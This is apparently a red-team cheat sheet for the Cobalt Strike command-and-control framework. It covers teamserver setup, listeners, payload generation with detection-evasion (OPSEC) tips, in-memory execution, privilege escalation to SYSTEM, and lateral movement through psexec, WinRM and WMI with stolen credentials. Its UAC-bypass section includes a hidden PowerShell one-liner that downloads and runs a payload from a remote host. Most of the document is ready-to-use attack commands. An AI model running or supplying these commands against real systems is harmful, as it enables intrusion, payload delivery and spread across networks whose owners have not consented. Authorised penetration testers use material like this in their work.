# Cobalt-Strike cheatsheet.

#### Start teamserver
```
cd /opt/cobaltstrike
./teamserver <IP> <PASSWORD>
```

#### Create a listener
- Cobalt Strike --> Listeners -->  Click the Add button and a New Listener dialogue will appear.
- Choose a descriptive name such as ```<protocol>-<port>``` example: ```http-80```.
- Set the variables and click Save.

#### Create a payload
- OPSEC: Staged payloads are good if your delivery method limits the amount of data you can send. However, they tend to have more indicators compared to stageless. Given the choice, go stageless.
- OPSEC: The use of 64-bit payloads on 64-bit Operating Systems is preferable to using 32-bit payloads on 64-bit Operating Systems.
- Attacks --> Packages --> Windows Executable (S).

#### Execute assembly in memory
```
execute-assembly <PATH TO EXE> -group=system
```

#### Create service binary
- Used for privilege escalation with services
- Attacks --> Packages --> Windows Executable (S) and selecting the Service Binary output type.
- TIP:  I recommend the use of TCP beacons bound to localhost only with privilege escalations

#### Connect to beacon
```
connect <IP> <PORT>
```

#### UAC bypass
```
elevate uac-token-duplication tcp-4444-local

runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
connect localhost 4444
```

####  Elevate to system
```
elevate svc-exe
```

### Lateral movement
#### Jump
```
jump [method] [target] [listener]

    Exploit                   Arch  Description
    -------                   ----  -----------
    psexec                    x86   Use a service to run a Service EXE artifact
    psexec64                  x64   Use a service to run a Service EXE artifact
    psexec_psh                x86   Use a service to run a PowerShell one-liner
    winrm                     x86   Run a PowerShell script via WinRM
    winrm64                   x64   Run a PowerShell script via WinRM
```

#### Remote-exec
```
remote-exec [method] [target] [command]

    psexec                          Remote execute via Service Control Manager
    winrm                           Remote execute via WinRM (PowerShell)
    wmi                             Remote execute via WMI
```

#### Using credentials
Each of these strategies are compatible with the various credential and impersonation methods described in the next section, Credentials & User Impersonation. For instance, if you have plaintext credentials of a domain user who is a local administrator on a target, use ```make_token``` and then ```jump``` to use that user's credentials to move laterally to the target.

